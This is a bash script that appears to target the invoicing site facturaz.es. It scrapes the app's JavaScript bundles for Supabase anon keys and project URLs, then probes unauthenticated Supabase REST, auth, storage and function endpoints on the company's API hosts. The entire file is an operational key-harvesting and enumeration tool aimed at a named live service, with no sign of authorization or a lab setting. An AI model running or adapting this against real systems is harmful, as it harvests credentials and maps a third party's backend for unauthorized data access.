#!/usr/bin/env bash
# Supabase key extraction + API enumeration for facturaz.es

echo "=============================="
echo " SUPABASE RECON — FACTURAZ"
echo "=============================="

# 1. Grab app.facturaz.es JS bundles and look for Supabase anon key + project URL
echo ""
echo "[+] Fetching app.facturaz.es HTML to find JS bundle paths..."
HTML=$(curl -skL "https://app.facturaz.es/" 2>/dev/null)
echo "$HTML" | grep -oE 'src="[^"]*\.js[^"]*"' | head -20

echo ""
echo "[+] Searching for Supabase config in HTML..."
echo "$HTML" | grep -iE "supabase|anon|apikey|VITE_|REACT_APP_|process\.env" | head -20

# 2. Try to find JS chunk URLs and grep for the key
JS_URLS=$(echo "$HTML" | grep -oE '(src|href)="(/[^"]*\.js[^"]*)"' | grep -oE '"[^"]*"' | tr -d '"' | head -10)
echo ""
echo "[+] JS files found:"
echo "$JS_URLS"

for js in $JS_URLS; do
  full_url="https://app.facturaz.es${js}"
  echo ""
  echo "  Fetching: $full_url"
  content=$(curl -skL "$full_url" 2>/dev/null)
  # Look for Supabase key patterns (starts with eyJ — JWT)
  key=$(echo "$content" | grep -oE '"eyJ[A-Za-z0-9_-]{50,}\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+"' | head -3)
  if [[ -n "$key" ]]; then
    echo "  [!] POSSIBLE JWT/ANON KEY: $key"
  fi
  # Look for supabase URL
  supa_url=$(echo "$content" | grep -oE '"https://[a-z0-9]+\.supabase\.(co|net|io)[^"]*"' | head -3)
  if [[ -n "$supa_url" ]]; then
    echo "  [!] SUPABASE URL: $supa_url"
  fi
  # Look for generic apikey/anon patterns
  echo "$content" | grep -oE '(apiKey|anon|anonKey|supabaseKey|SUPABASE)[^,;]{0,80}' | head -5
done

# 3. Try Supabase REST API paths directly on api.facturaz.es
echo ""
echo "[+] Trying Supabase-style REST paths on api.facturaz.es (no auth)..."
SUPABASE_PATHS=(
  "/rest/v1/"
  "/rest/v1/?select=*"
  "/auth/v1/"
  "/auth/v1/settings"
  "/storage/v1/"
  "/realtime/v1/"
  "/functions/v1/"
)
for path in "${SUPABASE_PATHS[@]}"; do
  result=$(curl -sk -o - -w "CODE:%{http_code}" "https://api.facturaz.es${path}" 2>/dev/null)
  code=$(echo "$result" | grep -o 'CODE:[0-9]*' | cut -d: -f2)
  body=$(echo "$result" | sed 's/CODE:[0-9]*$//' | head -c 200 | tr -d '\n')
  echo "  [$code] $path => $body"
done

# 4. Try REST API on www.facturaz.es too
echo ""
echo "[+] Trying REST paths on www.facturaz.es..."
for path in "/rest/v1/" "/api" "/api/v1" "/health" "/status"; do
  result=$(curl -skL -o - -w "CODE:%{http_code}" "https://www.facturaz.es${path}" 2>/dev/null)
  code=$(echo "$result" | grep -o 'CODE:[0-9]*' | cut -d: -f2)
  body=$(echo "$result" | sed 's/CODE:[0-9]*$//' | head -c 120 | tr -d '\n')
  echo "  [$code] $path => $body"
done
